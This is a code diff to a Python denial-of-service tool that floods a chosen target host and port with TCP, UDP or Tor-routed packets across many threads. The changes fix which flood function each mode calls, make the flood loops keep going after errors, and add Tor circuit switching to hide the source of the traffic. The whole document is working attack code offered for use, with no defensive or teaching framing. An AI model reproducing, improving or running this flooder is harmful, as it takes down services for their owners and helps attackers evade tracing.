@@ -10,9 +10,8 @@ import socket
 from threading import Thread
 from argparse import ArgumentParser
 # Site Modules
-from modules import tor_ip_switcher
+from modules.tor_ip_switcher import switch_ip
 from modules import socks
-from modules.socks import ProxyConnectionError
 from modules.colorama import Fore
 
 # Colors
@@ -35,25 +34,21 @@ class Dos():
     def tor_flood(self, ip, port, buffer_size):
         """ TCP flood over TOR. You need a running tor service on 'localhost' and default port (9050) """
 
-        print(GREEN + "TOR flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port,buffer_size))
         while True:
             try:
                 data = self.size(buffer_size)
                 with socks.socksocket() as sock:
+                    sock.settimeout(1)
                     sock.set_proxy(proxy_type=socks.SOCKS5, addr="localhost", port=9050)
                     sock.connect((ip, port))
                     sock.send(data)
-            except ProxyConnectionError as ex:
-                print(RED + "Waiting for new Circuit :", ex, + RESET)
-                continue
             except Exception:
                 print(RED + "Error in TOR" + RESET)
-                sys.exit(0)
+                continue
 
     def tcp_flood(self, ip, port, buffer_size):
         """ TCP flood function """
 
-        print(GREEN + "TCP flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port, buffer_size))
         while True:
             try:
                 data = self.size(buffer_size)
@@ -62,12 +57,11 @@ class Dos():
                     sock.send(data)
             except Exception:
                 print(RED + "Error in TCP" + RESET)
-                sys.exit(0)
+                continue
 
     def udp_flood(self, ip, port, buffer_size):
         """ UDP flood function """
 
-        print(GREEN + "UDP flood loaded » Firing up target [{}]:[{}] with a packet size of [{}]".format(ip, port, buffer_size))
         while True:
             try:
                 data = self.size(buffer_size)
@@ -75,7 +69,7 @@ class Dos():
                     sock.sendto(data, (ip, port))
             except Exception:
                 print(RED + "Error in UDP" + RESET)
-                sys.exit(0)
+                continue
 
 class Controller(Dos):
     """
@@ -112,7 +106,7 @@ class Controller(Dos):
         parser = ArgumentParser(description=CYAN + self.banner_txt.replace("-V-", self.version) + RESET)
         parser.add_argument("-t", "--target", type=str, dest="target_addr", metavar="Target Address", help="[www.domain.com]")
         parser.add_argument("-p", "--port", type=int, dest="port", metavar="Port Number", help="[1-35535]")
-        parser.add_argument("-m", "--mode", type=str, dest="dos_mode", metavar="DoS Mode", help="[udp|tcp]")
+        parser.add_argument("-m", "--mode", type=str, dest="dos_mode", metavar="DoS Mode", help="[udp|tcp|tor]")
         parser.add_argument("-a", "--amount", type=int, dest="amount", metavar="Number of Threads", help="N")
         parser.add_argument("-bs", "--buffer-size", type=int, dest="buffer_size", metavar="Package size in bytes", help="[1-65507]")
         args = parser.parse_args()
@@ -125,11 +119,10 @@ class Controller(Dos):
 
         if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
             try:
-                if args.dos_mode != 'udp' or 'tcp' or 'tor': raise Exception
-                elif args.port > 35535: raise Exception
+                if args.port > 35535: raise Exception
                 elif args.buffer_size > 65507: raise Exception
                 elif args.dos_mode == 'tor':
-                    self.tor_pass = tor_ip_switcher.check_for_file()
+                    self.tor_pass = self.check_for_tor_pass()
                 return True
             except Exception as ex:
                 print("Use -h or --help for futher information :", ex)
@@ -137,6 +130,27 @@ class Controller(Dos):
         else:
             print("Use -h or --help for futher information")
             sys.exit(0)
+
+    def check_for_tor_pass(self):
+        """ Checking if the file 'tor_pass.txt' exists. When not ask prompt for TOR Control password """
+
+        try:
+            if os.path.isfile("tor_pass.txt"):
+                with open("tor_pass.txt", 'rt') as f:
+                    tor_pass = f.read()
+                    print("tor_pass loaded")
+                    if tor_pass == "":
+                        print("tor_pass file is empty")
+                        sys.exit(0)
+            else:
+                tor_pass = str(input("Tor Control Password » "))
+                with open("tor_pass.txt", 'wt') as f:
+                    f.write(tor_pass)
+        except PermissionError as ex:
+            print("no read/write permission :", ex)
+            sys.exit(0)
+        else:
+            return tor_pass
 
     def get_fqdm(self, target_addr):
         """ Get Fully qualified domain name from the www.domain.com form"""
@@ -152,27 +166,30 @@ class Controller(Dos):
         """ Threading function to give arguments to dos class and start multiple threads """
 
         if dos_mode == 'tcp':
-            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+            self.dos = lambda t, p, b: self.tcp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'udp':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         elif dos_mode == 'tor':
-            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
-            tor_thread = Thread(target=tor_ip_switcher.switch_ip(tor_pass=self.tor_pass))
-            tor_thread.start()
+            self.dos = lambda t, p, b: self.tor_flood(target_ip, port, buffer_size)
+            switch_ip_true = switch_ip(tor_pass=self.tor_pass)
+            if switch_ip_true: print(CYAN + "NEW TOR CIRCUIT LOADED" + RESET)
+            else:
+                print(RED + "Error in switch_ip" + RESET)
+                sys.exit(0)
         try:
             for nr in range(int(amount)):
                 thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
                 print(GREEN + "Starting Thread nr [{}] to target [{}]:[{}]".format(thread, target_ip, port) + RESET)
                 thread.start()
-                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}]".format(dos_mode, thread, buffer_size, target_ip, port) + RESET)
+                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}] \n\n".format(dos_mode, thread, buffer_size, target_ip, port) + RESET)
             print(GREEN + "Sending packets ...\n\nPRESS CTRL+C TO QUIT" + RESET)
             while True:     # keep alive to still handle exceptions
                 time.sleep(1)
         except Exception as ex:
-            print(RED + "Error in Threading [{}] :", ex, + RESET)
+            print(RED + "Error in Threading [{}] :", ex)
             sys.exit(0)
         except KeyboardInterrupt as ex:
-            print(RED + "YOU PRESSED CTRL + C :", ex, + RESET)
+            print(RED + "YOU PRESSED CTRL + C :", ex)
             sys.exit(0)
 
     def run(self):
